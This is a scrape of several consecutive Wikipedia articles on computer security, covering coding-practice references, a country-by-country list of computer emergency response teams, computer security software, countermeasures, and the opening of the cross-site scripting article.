^ Meek, Brian; Heath, Patricia (1980), Guide to Good Programming Practice, Ellis Horwood, Wiley, p. 15

^ Sommerville, Ian (2004). Software Engineering (Seventh ed.). Pearson. pp. 118–123. ISBN 0-321-21026-3.

^ Hoare, C.A.R (1981). "The Emperor's Old Clothes" (PDF). Communications of the ACM. ACM. 24 (2): 75–83. doi:10.1145/358549.358561. S2CID 97895. Retrieved 25 Nov 2019.

^ Sommerville, Ian (2004). Software Engineering (Seventh ed.). Pearson. pp. 242–243. ISBN 0-321-21026-3.

^ Mayer, Herbert (1989). Advanced C programming on the IBM PC. Windcrest Books. p. xii (preface). ISBN 0830693637.

^ Meek, Brian; Heath, Patricia (1980), Guide to Good Programming Practice, Ellis Horwood, Wiley, p. 37

^ a b McConnell, Steve (2004). Code Complete (Second ed.). Microsoft Press. p. 70. ISBN 0-7356-1967-0.

^ Roedy Green. "unmaintainable code : Java Glossary". Retrieved 2013-11-26.

^ Multiple (wiki). "Best practices". Docforge. Retrieved 2012-11-13.

^ "Repetitive Strain Injury". Retrieved 30 October 2016.

^ 
See for example:
"Single-Point-of-Definition by Example". Retrieved 2015-11-30. 'Don't repeat anything. Aim for a Single Point of Definition for every aspect of your application [...]'.

^ "7 Application Deployment Best Practices - DZone DevOps". dzone.com.

^ "The seven deadly sins of software deployment [LWN.net]". lwn.net.

^ blog.fortrabbit.com/multi-stage-deployment-for-website-development

^ Cruz, Victor (April 3, 2013). "Why 30% of App Deployments Fail". Wired – via www.wired.com.

^ "The rules of software deployment". Archived from the original on 2010-05-13. 

^ "Tools You Need to Speed Up Deployment to Match Demand". February 3, 2017.

^ Ankerholz, Amber (September 14, 2016). "DevOps and the Art of Secure Application Deployment".

^ "Organizing Software Deployments to Match Failure Conditions". Amazon Web Services. May 5, 2014.

^ "Best Practices for Risk-Free Deployment". TheServerSide.com.

^ Ambler, Scott. "Effective Software Deployment". Dr. Dobb's.

^ "Enterprise application deployment: The humanity of software implementation". Archived from the original on 2016-08-21. 

^ "Hacking bureaucracy: improving hiring and software deployment | 18F: Digital service delivery". 18f.gsa.gov.

^ "A Bad Software Deployment Is Worse Than Doing Nothing". Intact Technology. June 1, 2016.

^ Davis, Alan Mark. (1995). 201 principles of software development. New York: McGraw-Hill. ISBN 0-07-015840-1. OCLC 31814837.

^ Johnson, Pontus; Ekstedt, Mathias; Jacobson, Ivar (2012). "Where's the Theory for Software Engineering?". IEEE Software. 29 (5): 96. doi:10.1109/MS.2012.127. ISSN 0740-7459. S2CID 38239662.

^ Krug, Steve (2014). Don't make me think, revisited : a common sense approach to Web usability. Bayle, Elisabeth,, Straiger, Aren,, Matcho, Mark (Third ed.). [San Francisco, California]. ISBN 978-0-321-96551-6. OCLC 859556499.


General
Harbison, Samuel P.; Steele, Guy L. (2002). C - A Reference Manual. ISBN 978-0-13-089592-9.
Enhancing the Development Life Cycle to Product Secure Software, V2.0 Oct. 2008 describes the security principles and practices that software developers, testers, and integrators can adopt to achieve the twin objectives of producing more secure software-intensive systems, and verifying the security of the software they produce.
Dutta, Shiv; Hook, Gary (June 26, 2003). "Best practices for programming in C". developerWorks. IBM. Archived from the original on July 13, 2009. Retrieved January 21, 2010.
External links[edit]
Paul Burden, co-author of the MISRA C Coding Standards and PRQA's representative on the MISRA C working group for more than 10 years discusses a common coding standard fallacy: "we don't need a coding standard!, we just need to catch bugs!"




Retrieved from "https://en.wikipedia.org/w/index.php?title=Coding_best_practices&oldid=1128959333"
Categories: Software development processComputer programmingHidden categories: Articles lacking in-text citations from July 2012All articles lacking in-text citationsWikipedia articles with style issues from March 2008All articles with style issuesArticles with multiple maintenance issuesAll accuracy disputesArticles with disputed statements from December 2017
 



From Wikipedia, the free encyclopedia


Organisation which responds to computer security incidents
This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Computer emergency response team" – news · newspapers · books · scholar · JSTOR (December 2016) (Learn how and when to remove this template message)

A computer emergency response team (CERT) is an expert group that handles computer security incidents. Alternative names for such groups include computer emergency readiness team and computer security incident response team (CSIRT). A more modern representation of the CSIRT acronym is Cyber Security Incident Response Team.


History[edit]
The name "Computer Emergency Response Team" was first used in 1988 by the CERT Coordination Center (CERT-CC) at Carnegie Mellon University (CMU). The term CERT is registered as a trade and service mark by CMU in multiple countries worldwide. CMU encourages the use of Computer Security Incident Response Team (CSIRT) as a generic term for the handling of computer security incidents. CMU licenses the CERT mark to various organizations that are performing the activities of a CSIRT.
The history of CERT, and of CSIRTS, is linked to the existence of malware, especially computer worms and viruses. Whenever a new technology arrives, its misuse is not long in following. The first worm in the IBM VNET was covered up. Shortly after, a worm hit the Internet on 3 November 1988, when the so-called Morris Worm paralysed a good percentage of it.  This led to the formation of the first computer emergency response team at Carnegie Mellon University under U.S. Government contract. With the massive growth in the use of information and communications technologies over the subsequent years, the generic term 'CSIRT' refers to an essential part of most large organisations' structures. In many organisations the CSIRT evolves into an information security operations center.

Global associations and teams[edit]




Logo

Organization

Description

Size

Member of FIRST




FIRST[1]

The Forum of Incident Response and Security Teams is the global association of CSIRTs.

605 member organizations.

n/a




Packet Clearing House[2]

"CERT of last resort" with global coverage, serving countries and constituencies which are not yet served by their own dedicated CERT. Founded in 1994.

18 staff, presence in 106 countries, budget US$251m/yr.

Yes

National or economic region teams[edit]




Country

Team/s

Description

Size

Member of FIRST


 Algeria

CERIST/

The Research Centre on Scientific and Technical Information in Algeria, CERIST.






 Australia

AusCERT[3]

Cyber Emergency Response Team (CERT) in Australia and the Asia/Pacific region[4]



Yes


 Australia

Australian Cyber Security Centre (ACSC)[5]

In 2010 the Australian Federal Government started CERT Australia. In 2018 CERT Australia became part of the Australian Cyber Security Centre (ACSC) which then in turn became part of the Australian Signals Directorate (ASD).



Yes


 Austria

CERT.at

The national Computer Emergency Response Team for Austria as part of the Austrian domain registry NIC.at for .at.[6]

9 employees[7]

Yes


 Austria

govCERT Austria

A public-private partnership of CERT.at and the Austrian Chancellery.[8]



Yes


 Austria

Austrian Energy CERT (AEC)

A cooperation between CERT.at and the Austrian energy sector for energy and gas sector.[9]



Yes


 Austria

ACOnet-CERT

The Computer Emergency Response Team of ACOnet.[10]



Yes


 Azerbaijan

CERT.gov.az

Azerbaijan Government Computer Emergency Response Team.



Yes


 Bangladesh

BGD e-Gov CIRT

Bangladesh Government's Computer Incident Response Team (BGD e-GOV CIRT) is acting as the National CIRT of Bangladesh (N-CIRT) currently with responsibilities including receiving, reviewing, and responding to computer security incidents and activities.



Yes


 Belgium

CERT.be

Centre for Cyber Security Belgium



Yes


 Bolivia

CGII.gob.bo

Centro de Gestión de Incidentes Informáticos

8 employees




 Brazil

CERT.br

Brazilian National Computer Emergency Response Team



Yes


 Canada

Canadian Centre for Cyber Security

Assumed national CERT role with the transfer of the Canadian Cyber Incident Response Centre (CCIRC) from Public Safety Canada in October 2018.[11]



Yes


 China

CNCERT/CC[12]

Founded in September 2002

40 employees[13]

Yes


 Colombia

colCERT

Grupo de Respuesta a Emergencias Cibernéticas de Colombia - colCERT






 Croatia

CARNET CERT





Yes


 Czech Republic

CSIRT.CZ





Yes


 Denmark

DKCERT

Danish Computer Security Incident Response Team



Yes


 Denmark

CFCS-DK

Centre for Cyber Security



Yes


 Ecuador

ECUCERT

Centro de Respuesta a Incidentes Informáticos del Ecuador



Yes


 Egypt

EG-CERT[14]

Work as trust center for Cyber Security Services across Egyptian cyber space.[15]



Yes


 Estonia

CERT-EE[16]

The national and governmental Computer Emergency Response Team for Estonia.



Yes


 Europe

CERT-EU[17]

Computer Emergency Response Team (CERT-EU) for the EU institutions, agencies and bodies.[18]



Yes


Eurocontrol

EATM-CERT

European Air Traffic Management Computer Emergency Response Team






 Finland

NCSC-FI

National Cyber Security Centre of Finland



Yes


 France

CERT-FR




Yes


 Germany

CERT-Bund





Yes


 Ghana

CERT-GH

National Cyber Security Centre of Ghana






 Ghana

NCA-CERT

National Communications Authority Computer Emergency Response Team






 Hong Kong

HKCERT





Yes


 Iceland

CERT-IS

The national Computer Emergency Response Team for Iceland as part of the Post and Telecommunication Administration in Iceland



Yes


 India

CERT-In

CERT-In



Yes


 Indonesia

ID-SIRTII/CC

Indonesia Security Incident Response Team on Internet Infrastructure coordination centre was founded in 2007.[19]



Yes


 Iran

CERTCC MAHER

Maher Center of Iranian National Computer Emergency Response Team






 Israel

CERT-IL

The Israeli Cyber Emergency Response Team is part of Israel National Cyber Directorate



Yes


 Italia

CSIRT Italia

Established at the National Cybersecurity Agency for the implementation of the NIS Directive in Italy absorbed previous CERT-PA and CERT-Nazionale.






 Japan

JPCERT/CC





Yes


 Japan

IPA-CERT





Yes


 Jersey

CERT-JE[20]

Jersey Cyber Emergency Response Team. Established 2021.[21]






 Kazakhstan

TSARKA

Computer Emergency Response Team in Kazakhstan was founded in 2015



Yes


 Kyrgyzstan

CERT-KG








 Laos

LaoCERT

Lao Computer Emergency Response Team






 Latvia

CERT.LV

The Information Technology Security Incident Response Institution of the Republic of Latvia.



Yes


 Luxembourg

CIRCL

CIRCL is the CERT for the private sector, communes and non-governmental entities in Luxembourg.



Yes


 Macau

MOCERT








 Malaysia

MyCERT

The Malaysia Computer Emergency Response Team was established in 1997. It is now part of CyberSecurity Malaysia[22]



Yes


 Mexico

CERT-MX

The Centre of Expertise in Technological Response, is part of the Scientific Division of the Federal Police (Mexico)



Yes


 Moldova

CERT-GOV-MD

Center for Response on Cybersecurity Incidents – CERT-GOV-MD



Yes


 Mongolia

MNCERT/CC

Mongolian Cyber Emergency Response Team / Coordination Center. Founded in 2014.



Yes


 Morocco

maCERT





Yes


 Netherlands

NCSC-NL








 Netherlands

SURFcert

Computer Emergence Response Team for the Dutch research and education network.



Yes


 New Zealand

CERTNZ[23]





Yes


 Nigeria

ngCERT[24]





Yes


 Norway

NorCERT[25]

Cyber Security Center and national CERT of Norway. Part of the National Security Authority (NSM).



Yes


 Pakistan

PakCERT








 Papua New Guinea

PNGCERT








 Philippines

CSP-CERT

CyberSecurity Philippines – CERT, established in 2016 the very first Non-profit CSIRT/CERT organization in the Philippines.






 Poland

CERT Polska





Yes


 Portugal

CERT.PT

Part of the National Cyber Security Center (CNCS) of Portugal



Yes


 Qatar

Q-CERT





Yes


 Republic of Ireland

CSIRT-IE








 Romania

CERT-RO

Centrul Naţional de Răspuns la Incidente de Securitate Cibernetică – CERT-RO






 Russia

GOV-CERT








 Russia

RU-CERT





Yes


 Russia

CERT-GIB








 Russia

BI.ZONE-CERT








 Russia

Financial CERT

Financial Sector Computer Emergency Response Team (special division of the Bank of Russia)



Yes


 Russia

KASPERSKY ICS CERT








 Russia

NCIRCC








 Saudi Arabia

Saudi-CERT



Saudi CERT has three main functions: increasing the level of knowledge and awareness regarding cybersecurity, disseminate information about vulnerabilities, and campaigns and cooperating with other response teams. Saudi CERT serves different stakeholder in the country including individuals business and government agencies. And proactive and reactive services.



Yes


 Serbia

SRB-CERT

National CERT of the Republic of Serbia



Yes


 Serbia

MUP CERT

Centar za reagovanje na napade na informacioni sistem



Yes


 Singapore

SingCERT





Yes


 Slovakia

SK-CERT

Národná jednotka SK-CERT | National unit SK-CERT



Yes


 Slovenia

SI-CERT

Slovenian Computer Emergency Response Team, part of ARNES



Yes


 Slovenia

SIGOV-CERT

Specifically formed for information security in the government sector of Slovenia






 South Africa

CSHUB-CSIRT

CyberSecurity Hub CSIRT established by the Department of Telecommunications and Postal Services[26]






 South Korea

KrCERT/CC





Yes


 Spain

CCN-CERT

Centro Criptológico Nacional



Yes


 Sri Lanka

SL CERT | CC[27]

Computer Emergency Readiness Team | Co-ordination Center



Yes


 Sweden

CERT-SE[28]





Yes


 Switzerland

GovCERT.ch[29]

The parent organisation of GovCERT.ch is the Swiss Reporting and Analysis Centre for Information Assurance (MELANI)[30]



Yes


 Taiwan

TWCERT/CC[31]





Yes


 Thailand

ThaiCERT[32]





Yes


 Tonga

CERT Tonga








 Turkey

TR-CERT (USOM)





Yes


 Ukraine

FS Group

FS Group – CERT



Yes


 Ukraine

CERT-UA

Computer Emergency Response Team of Ukraine



Yes


 United Arab Emirates

aeCERT

The United Arab Emirates – Computer Emergency Response Team



Yes


 Uganda

CERT.UG

Uganda National Computer Emergency Response Team /CC (Absorbed UG-CERT [1])



Yes


 United Kingdom

National Cyber Security Centre

Absorbed CERT-UK



Yes


 United States

US-CERT

Part of the National Cyber Security Division of the United States Department of Homeland Security.[33]



Yes


 United States

CERT/CC

Created by the Defense Advanced Research Projects Agency (DARPA) and run by the Software Engineering Institute (SEI) at the Carnegie Mellon University



Yes


 Uzbekistan

UzCERT

Computer Emergency Response Team of Uzbekistan






 Vietnam

VNCERT

Vietnam CERT



Yes

See also[edit]
Computer security
Digital humanitarianism
Emergency prevention
Proactive cyber defence
White hat (computer security)
Critical infrastructure protection
Incident management
Information security
Responsible disclosure
Vulnerability (computing)
References[edit]


^ "FIRST – Improving Security Together". FIRST. Retrieved 6 December 2018.

^ "Packet Clearing House". Retrieved 11 January 2022.

^ "About AusCERT – AusCERT Main". Auscert.org.au. Retrieved 2 December 2016.

^ Smith, Frank; Ingram, Graham (2 November 2017). "Organising cyber security in Australia and beyond". Australian Journal of International Affairs. 71 (6): 642–660. doi:10.1080/10357718.2017.1320972. ISSN 1035-7718. S2CID 157160755.

^ "About | Cyber.gov.au". cyber.gov.au. Retrieved 29 September 2019.

^ "Zuständigkeit – CERT.at". cert.at. Retrieved 17 June 2017.

^ "Das Team – CERT.at". cert.at. Retrieved 30 June 2017.

^ "GovCERT in Österreich – GovCERT.gv.at". govcert.gv.at. Retrieved 17 June 2017.

^ "- CERT.at". cert.at. Retrieved 17 June 2017.

^ "Security". aco.net. Retrieved 17 June 2017.

^ Toolkit, Web Experience. "The Minister of National Defence Announces the Launch of the Canadian Centre for Cyber Security". cse-cst.gc.ca. Retrieved 2 December 2018.

^ "About CNCERT". CNCERT. Retrieved 16 August 2017.

^ "中国互联网网络安全报告" (PDF). cert.org.cn. Retrieved 25 July 2018.

^ "EG-CERT". Retrieved 7 November 2017.

^ "EG-CERT Team Information". Retrieved 7 November 2017.

^ "CERT Estonia". Retrieved 15 November 2018.

^ "CERT-EU". Retrieved 26 February 2020.

^ "CERT-EU team information". Retrieved 26 February 2020.

^ "ID-SIRTII/CC". FIRST – Forum of Incident Response and Security Teams. Retrieved 30 June 2017.

^ "Jersey Cyber Emergency Response Team". Retrieved 1 July 2021.

^ "Cyber resilience team established". Retrieved 1 July 2021.

^ "CyberSecurity Malaysia | An Agency Under MOSTI". cybersecurity.my. Retrieved 22 September 2017.

^ "About us | CERT NZ". cert.govt.nz. Retrieved 11 April 2017.

^ "ngCERT". Cert.gov.ng. 15 May 2015. Retrieved 2 December 2016.

^ "NorCert – Nasjonalt Cybersikkerhetssenter". nsm.stat.no. Retrieved 26 August 2018.

^ "CSHUB-CSIRT description according to RFC2350" (PDF). cybersecurityhub.gov.za. Retrieved 18 February 2021.

^ "Welcome to Sri Lanka CERT|CC". slcert.gov.lk. Retrieved 27 May 2018.

^ "About CERT-SE – CERT-SE website". cert.se. Retrieved 18 January 2017.

^ "Swiss Government Computer Emergency Response Team (GovCERT.ch)". govcert.admin.ch. Retrieved 13 May 2018.

^ "Reporting and Analysis Centre for Information Assurance (MELANI)". melani.admin.ch. Retrieved 13 May 2018.

^ "TWCERT/CC 台灣電腦網路危機處理暨協調中心". Cert.org.tw. 27 September 2010. Archived from the original on 14 November 2016. Retrieved 2 December 2016.

^ "เกี่ยวกับไทยเซิร์ต" [About ThaiCert] (in Thai). Thailand Computer Emergency Response Team. Retrieved 28 April 2019.

^ Verton, Dan (28 January 2004). "DHS launches national cyber alert system". Computerworld. IDG. Retrieved 15 June 2008.


External links[edit]
CERT-CC website
FIRST website




Retrieved from "https://en.wikipedia.org/w/index.php?title=Computer_emergency_response_team&oldid=1136222760"
Categories: Carnegie Mellon UniversityEmergency servicesComputer security organizationsHidden categories: CS1 Thai-language sources (th)Articles with short descriptionShort description matches WikidataArticles needing additional references from December 2016All articles needing additional referencesUse dmy dates from January 2023
 



From Wikipedia, the free encyclopedia


Computer program for information security
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Computer security software or cybersecurity software is any computer program designed to influence information security.  This is often taken in the context of defending computer systems or data, yet can incorporate programs designed specifically for subverting computer systems due to their significant overlap, and the adage that the best defense is a good offense.
The defense of computers against intrusion and unauthorized use of resources is called computer security. Similarly, the defense of computer networks is called network security.
The subversion of computers or their unauthorized use is referred to using the terms cyberwarfare, cybercrime, or security hacking (later shortened to hacking for further references in this article due to issues with hacker, hacker culture and differences in white/grey/black 'hat' color identification).


Types[edit]
Below, various software implementations of Cybersecurity patterns and groups outlining ways a host system attempts to secure itself and its assets from malicious interactions, this includes tools to deter both passive and active security threats. Although both security and usability are desired, today it is widely considered in computer security software that with higher security comes decreased usability, and with higher usability comes decreased security.[1]

Prevent access[edit]
The primary purpose of these types of systems is to restrict and often to completely prevent access to computers or data except to a very limited set of users. The theory is often that if a key, credential, or token is unavailable then access should be impossible. This often involves taking valuable information and then either reducing it to apparent noise or hiding it within another source of information in such a way that it is unrecoverable.

Cryptography and Encryption software
Steganography and Steganography tools
A critical tool used in developing software that prevents malicious access is Threat Modeling.[2] Threat modeling is the process of creating and applying mock situations where an attacker could be trying to maliciously access data in cyberspace. By doing this, various profiles of potential attackers are created, including their intentions, and a catalog of potential vulnerabilities are created for the respective organization to fix before a real threat arises.[3] Threat modeling covers a wide aspect of cyberspace, including devices, applications, systems, networks, or enterprises. Cyber threat modeling can inform organizations with their efforts pertaining to cybersecurity in the following ways:[4]

Risk Management
Profiling of current cybersecurity applications
Considerations for future security implementations
Regulate access[edit]
The purpose of these types of systems is usually to restrict access to computers or data while still allowing interaction.  Often this involves monitoring or checking credential, separating systems from access and view based on importance, and quarantining or isolating perceived dangers. A physical comparison is often made to a shield.  A form of protection whose use is heavily dependent on the system owners preferences and perceived threats.  Large numbers of users may be allowed relatively low-level access with limited security checks, yet significant opposition will then be applied toward users attempting to move toward critical areas.

Access control
Firewall
Sandbox
Monitor access[edit]
The purpose of these types of software systems is to monitor access to computers systems and data while reporting or logging the behavior.  Often this is composed of large quantities of low priority data records / logs, coupled with high priority notices for unusual or suspicious behavior. 

Diagnostic program
Intrusion detection system (IDS)
Intrusion prevention system (IPS)
Log management software
Records Management
Security information management
Security event management
Security information and event management (SIEM)
Surveillance monitor[edit]
These programs use algorithms either stolen from, or provided by, the police and military internet observation organizations to provide the equivalent of a police Radio scanner.  Most of these systems are born out of mass surveillance concepts for internet traffic, cell phone communication, and physical systems like CCTV.  In a global perspective they are related to the fields of SIGINT and ELINT and approach GEOINT in the global information monitoring perspective.  Several instant messaging programs such as ICQ (founded by "former" members of Unit 8200), or WeChat and QQ (rumored 3PLA/4PLA connections[5][6]) may represent extensions of these observation apparati.

Block or remove malware[edit]
The purpose of these types of software is to remove malicious or harmful forms of software that may compromise the security of a computer system.  These types of software are often closely linked with software for computer regulation and monitoring.  A physical comparison to a doctor, scrubbing, or cleaning ideas is often made, usually with an "anti-" style naming scheme related to a particular threat type.  Threats and unusual behavior are identified by a system such as a firewall or an intrusion detection system, and then the following types of software are used to remove them.  These types of software often require extensive research into their potential foes to achieve complete success, similar to the way that complete eradication of bacteria or viral threats does in the physical world.  Occasionally this also represents defeating an attackers encryption, such as in the case of data tracing, or hardened threat removal.

Anti-keyloggers
Anti-malware
Anti-spyware
Anti-subversion software
Anti-tamper software
Antivirus software
See also[edit]
Computer security
Data security
Emergency management software
Cloud Workload Protection Platforms
Computer Antivirus Software
References[edit]


^ Barragán, Claudio Casado (2017). Information Technology - New Generations. Springer International Publishing. pp. 395–398. ISBN 9783319549774.

^ Bodeau, Deborah J.; McCollum, Catherine D.; Fox, David B. (2018-04-07). "Cyber Threat Modeling: Survey, Assessment, and Representative Framework". Archived from the original on September 29, 2021. {{cite journal}}: Cite journal requires |journal= (help)

^ "Threat Modeling: 12 Available Methods". SEI Blog. Retrieved 2021-10-04.

^ Jones, Andy (2005). Risk management for computer security : Protecting your network and information assets. Debi Ashenden. Amsterdam, Netherlands: Elsevier Butterworth-Heinemann. ISBN 978-0-08-049155-4. OCLC 159937634.

^ O'Neill, Patrick Howell (3 May 2017). "Under tough surveillance, China's cybercriminals find creative ways to chat". SNG. cyberscoop. Retrieved 22 October 2020.

^ Dasgupta, Binayak (1 July 2020). "Mass surveillance risk real with Chinese apps: Experts". Hindustan Times, New Delhi. Retrieved 22 October 2020.






Retrieved from "https://en.wikipedia.org/w/index.php?title=Computer_security_software&oldid=1120804190"
Categories: Computer security softwareHidden categories: CS1 errors: missing periodicalArticles with short descriptionShort description is different from Wikidata
 



From Wikipedia, the free encyclopedia


Process to reduce a security threat
For other uses, see Countermeasure.

In computer security a countermeasure is an action, device, procedure, or technique that reduces a threat, a vulnerability, or an attack by eliminating or preventing it, by minimizing the harm it can cause, or by discovering and reporting it so that corrective action can be taken.
The definition is as IETF RFC 2828[1] that is the same as CNSS Instruction No. 4009 dated 26 April 2010 by Committee on National Security Systems of United States of America.[2]
According to the Glossary[3] by InfosecToday, the meaning of countermeasure is:

The deployment of a set of security services to protect against a security threat.
A synonym is security control.[2][4]
In telecommunications, communication countermeasures are defined as security services as part of OSI Reference model by ITU-T X.800 Recommendation.
X.800 and ISO ISO 7498-2 (Information processing systems – Open systems interconnection – Basic Reference Model – Part 2: Security architecture are technically aligned.
The following picture explain the relationships between these concepts and terms:

      + - - - - - - - - - - - - +  + - - - - +  + - - - - - - - - - - -+
      | An Attack:              |  |Counter- |  | A System Resource:   |
      | i.e., A Threat Action   |  | measure |  | Target of the Attack |
      | +----------+            |  |         |  | +-----------------+  |
      | | Attacker |<==================||<=========                 |  |
      | |   i.e.,  |   Passive  |  |         |  | |  Vulnerability  |  |
      | | A Threat |<=================>||<========>                 |  |
      | |  Agent   |  or Active |  |         |  | +-------|||-------+  |
      | +----------+   Attack   |  |         |  |         VVV          |
      |                         |  |         |  | Threat Consequences  |
      + - - - - - - - - - - - - +  + - - - - +  + - - - - - - - - - - -+

A resource (both physical or logical) can have one or more vulnerabilities that can be exploited by a threat agent in a threat action. The result can potentially compromises the confidentiality, integrity or availability properties of resources (potentially different that the vulnerable one) of the organization and others involved parties (customers, suppliers).
The so-called CIA triad is the basis of information security.
The attack can be active when it attempts to alter system resources or affect their operation: so it compromises integrity or availability. A "passive attack" attempts to learn or make use of information from the system but does not affect system resources, compromising confidentiality.
A threat is a potential for violation of security, which exists when there is a circumstance, capability, action, or event that could breach security and cause harm. That is, a threat is a possible danger enabling the exploitation of a vulnerability. A threat can be either "intentional" (i.e., intelligent; e.g., an individual cracker or a criminal organization) or "accidental" (e.g., the possibility of a computer malfunctioning, or the possibility of an "act of God" such as an earthquake, a fire, or a tornado).[1]
A set of policies concerned with information security management, the information security management systems (ISMS), has been developed to manage, according to risk management principles, the countermeasures in order to accomplish to a security strategy set up following rules and regulations applicable in a country.[4]


Countermeasures Against Physical Attacks[edit]
If a potential malicious actor has physical access to a computer system, they have a greater chance of inflicting harm upon it.

Electronic Destruction Devices[edit]
Devices such as a USB Killer may be used to damage or render completely unusable anything with a connection to the motherboard of a computer, such as a USB port, video port, Ethernet port, or serial port.[5] Without proper protection, these devices may result in the destruction of ports, adapter cards, storage devices, RAM, motherboards, CPUs, or anything physically connected to the device attacked, such as monitors, flash drives, or wired switches. These types of devices can even be used to damage smartphones and cars, as well.[6]
This threat can be mitigated by not installing or restricting physical access to easily accessible ports in situations where they are not necessary. A port-closing lock which permanently disables access to a port short of the actual port being disassembled.[7] When it is necessary for a port to be accessible, an optocoupler can allow for a port to send and receive data to a computer or device without a direct electrical connection, preventing the computer or device from receiving any dangerous voltage from an external device.[8]

Hard Drives and Storage[edit]
In an unsecured scenario, a malicious actor may steal or destroy storage devices such as hard drives or SSDs, resulting in the destruction or theft of valuable data.
If the data of a storage device is no longer necessary, data theft is best prevented against by physically destroying or shredding the storage device.[9]
If the data of a storage device is in use and must be secured, one can use encryption to encrypt the contents of a storage device, or even encrypt the whole storage device save for the master boot record. The device can then be unlocked with a password, biometric authentication, a physical dongle, a network interchange, a one-time password, or any combination thereof. If this device is a boot drive, however, it must be unencrypted in a pre-boot environment so the operating system can be accessed. Striping, or breaking data into chunks stored upon multiple drives which must be assemble in order to access the data, is a possible solution to physical drive theft, provided that the drives are stored in multiple, individually secured locations, and are enough in number that no one drive can be used to piece together meaningful information.
Not to be neglected is the process of adding physical barriers to the storage devices themselves. Locked cases or physically hidden drives, with a limited number of personnel with knowledge and access to the keys or locations, may prove to be a good first line against physical theft.

See also[edit]

Countermeasure
Computer security
Computer insecurity
Common Vulnerabilities and Exposures (CVE)
Common Vulnerability Scoring System (CVSS)
Exploit (computer security)
Full disclosure (computer security)
IT risk
Metasploit
Month of Bugs
Vulnerability management
w3af

References[edit]


^ a b RFC 2828 Internet Security Glossary

^ a b CNSS Instruction No. 4009 Archived 27 February 2012 at the Wayback Machine dated 26 April 2010

^ InfosecToday Glossary

^ a b Wright, Joe; Harmening, Jim (2009). "15".  In Vacca, John (ed.). Computer and Information Security Handbook. Morgan Kaufmann Publications. Elsevier Inc. p. 257. ISBN 978-0-12-374354-1.

^ "USB Killer, yours for $50, lets you easily fry almost every device". Ars Technica. Retrieved 26 August 2018.

^ "This $50 USB Killer Can Destroy Almost Any Smartphone, Computer Or Car Within Seconds". TechFonder. Retrieved 26 August 2018.

^ "Bench Talk | Protect USB Ports From Nefarious "USB Killers"". www.mouser.com. Retrieved 26 August 2018.

^ "Optocoupler Tutorial". ElectronicsTutorials.

^ "Discarded hard drives can be dangerous". ComputerWeekly.com. Retrieved 26 August 2018.


External links[edit]
Term in FISMApedia




Retrieved from "https://en.wikipedia.org/w/index.php?title=Countermeasure_(computer)&oldid=1110282186"
Categories: Computer network securityHidden categories: Webarchive template wayback linksArticles with short descriptionShort description is different from WikidataUse dmy dates from July 2013
 



From Wikipedia, the free encyclopedia


"XSS" redirects here. For other uses, see XSS (disambiguation).Computer security vulnerability


Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Cross-site scripting (XSS) is a type of security vulnerability that can be found in some web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy. Cross-site scripting carried out on websites accounted for roughly 84% of all security vulnerabilities documented by Symantec up until 2007.[1] XSS effects vary in 
range from petty nuisance to significant security risk, depending on the sensitivity of the data handled by the vulnerable site and the nature of any security mitigation implemented by the site's owner network.


Background[edit]
Security on the web depends on a variety of mechanisms, including an underlying concept of trust known as the same-origin policy. This essentially states that if content from one site (such as https://mybank.example1.com) is granted permission to access resources (like cookies etc.) on a web browser, then content from any URL with the same (1) URI scheme, (2) host name, and (3) port number will share these permissions. Content from URLs where any of these three attributes are different will have to be granted permissions separately.[2]
Cross-site scripting attacks use known vulnerabilities in web-based applications, their servers, or the plug-in systems on which they rely. Exploiting one of these, attackers fold malicious content into the content being delivered from the compromised site. When the resulting combined content arrives at the client-side web browser, it has all been delivered from the trusted source, and thus operates under the permissions granted to that system. By finding ways of injecting malicious scripts into web pages, an attacker can gain elevated access-privileges to sensitive page content, to session cookies, and to a variety of other information maintained by the browser on behalf of the user. Cross-site scripting attacks are a case of code injection.
